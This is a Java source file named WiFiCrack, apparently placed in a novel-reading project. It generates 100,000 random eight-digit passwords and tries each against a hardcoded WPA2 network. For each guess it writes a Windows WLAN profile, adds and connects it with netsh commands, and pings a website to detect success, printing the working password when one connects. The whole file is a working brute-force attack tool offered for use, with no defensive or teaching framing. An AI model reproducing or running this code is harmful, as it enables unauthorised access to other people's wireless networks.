package com.yuquancoco.novel.controller;

import cn.hutool.core.util.RandomUtil;

import java.io.*;

public class WiFiCrack {//WiFi名
    //public static final String WIFI_NAME="TP-LINK_1E4Adeng";
    public static final String WIFI_NAME="rx00032";

    //转16进制
    //public static final String WIFI_NAME_HEX="54502D4C494E4B5F3145344164656E67";
    public static final String WIFI_NAME_HEX="6950686F6E65";

    //CMD以及XML文件配置目录
    public static final String path="E:\\wifi\\test";

    //.xml文件模板,变量为密码
    public static String XML_FORMAT(String WIFI_PASSWORD) {
        return
                "<?xml version=\"1.0\"?>\r\n" +
                        "<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\r\n" +
                        "\t<name>"+WIFI_NAME+"</name>\r\n" +
                        "\t<SSIDConfig>\r\n" +
                        "\t\t<SSID>\r\n" +
                        "\t\t\t<hex>"+WIFI_NAME_HEX+"</hex>\r\n" +
                        "\t\t\t<name>"+WIFI_NAME+"</name>\r\n" +
                        "\t\t</SSID>\r\n" +
                        "\t</SSIDConfig>\r\n" +
                        "\t<connectionType>ESS</connectionType>\r\n" +
                        "\t<connectionMode>auto</connectionMode>\r\n" +
                        "\t<MSM>\r\n" +
                        "\t\t<security>\r\n" +
                        "\t\t\t<authEncryption>\r\n" +
                        "\t\t\t\t<authentication>WPA2PSK</authentication>\r\n" +
                        "\t\t\t\t<encryption>AES</encryption>\r\n" +
                        "\t\t\t\t<useOneX>false</useOneX>\r\n" +
                        "\t\t\t</authEncryption>\r\n" +
                        "\t\t\t<sharedKey>\r\n" +
                        "\t\t\t\t<keyType>passPhrase</keyType>\r\n" +
                        "\t\t\t\t<protected>false</protected>\r\n" +
                        "\t\t\t\t<keyMaterial>"+WIFI_PASSWORD+"</keyMaterial>\r\n" +
                        "\t\t\t</sharedKey>\r\n" +
                        "\t\t</security>\r\n" +
                        "\t</MSM>\r\n" +
                        "</WLANProfile>\r\n";
    }

    public static void main(String[] args) throws IOException {
        String content = "";
        for (int i = 0; i < 100000; i++) {
//            content = content + RandomUtil.randomString(8) + "\n"; //字母加数字
            content = content + RandomUtil.randomNumbers(8) + "\n"; //数字
        }
        try {
            File file = new File("E:\\wifi\\弱口令字典.txt");
            if (!file.getParentFile().exists()) {
                file.getParentFile().mkdirs();
            }
            if (!file.exists()) {
                file.createNewFile();
            }
            // 开始下载小说
            PrintWriter pw = new PrintWriter(file);
            pw.write(content);
            pw.close();
        } catch (IOException e) {
//            e.printStackTrace();
        }

        //从口令字典读取密码
        String password=null;
        String path = "E:\\wifi\\弱口令字典.txt";
        BufferedReader reader = new BufferedReader(new FileReader(path));
        //暴力破解
        int count=0;//尝试次数
        while ((password = reader.readLine()) != null) {
            if(password.length()<8) {
                continue;//口令长度大于8
            }
            count++;
            // 创建配置文件,参数为口令
            createXml(password);
            // 添加配置文件
            addXml();
            // 连接网络
            conect();
            // 测试是否连通有网，先睡个3秒，识别网络有点慢，ping有点慢
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            if (ping()) {
                System.out.println("网络连接成功，密码是" + password+"|尝试次数为"+count);
                break;
            }
            else {
                System.out.println("密码错误，尝试次数为"+count);
                System.out.println("---------------------------");
            }
        }
    }
    //先生成配置文件，只修改密码
    public static void createXml(String password){
        File file = new File(path,WIFI_NAME+".xml");
        try {
            PrintStream ps = new PrintStream(file);
            String str = XML_FORMAT(password);
            ps.println(str);
            ps.close();
            System.out.println(".xml文件创建成功");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
            System.out.println(".xml文件创建失败");
        }
    }
    //添加配置文件指令以及显示结果输出
    public static void addXml() {
        try {
            Process process = Runtime.getRuntime().exec(
                    "netsh wlan add profile filename="+WIFI_NAME+".xml",
                    null, new File(path));
            //打印执行结果
            BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "gbk"));
            String line = null;
            while ((line = bReader.readLine()) != null) {
                System.out.println(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    //连接网络指令以及结果输出
    public static void conect() {
        try {
            Process process = Runtime.getRuntime().exec(
                    "netsh wlan connect name="+WIFI_NAME,
                    null, new File(path));
            //打印执行结果
            BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "gbk"));
            String line = null;
            while ((line = bReader.readLine()) != null) {
                System.out.println(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    //ping测试是否连接成功
    public static boolean ping() {
        boolean flag=false;
        try {
            Process process = Runtime.getRuntime().exec(
                    "ping bilibili.com",
                    null, new File(path));
            //存储结果
            BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "gbk"));
            String line = null;
            while ((line = bReader.readLine()) != null) {
                if(line.contains("来自")) {
                    flag=true;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return flag;
    }
}
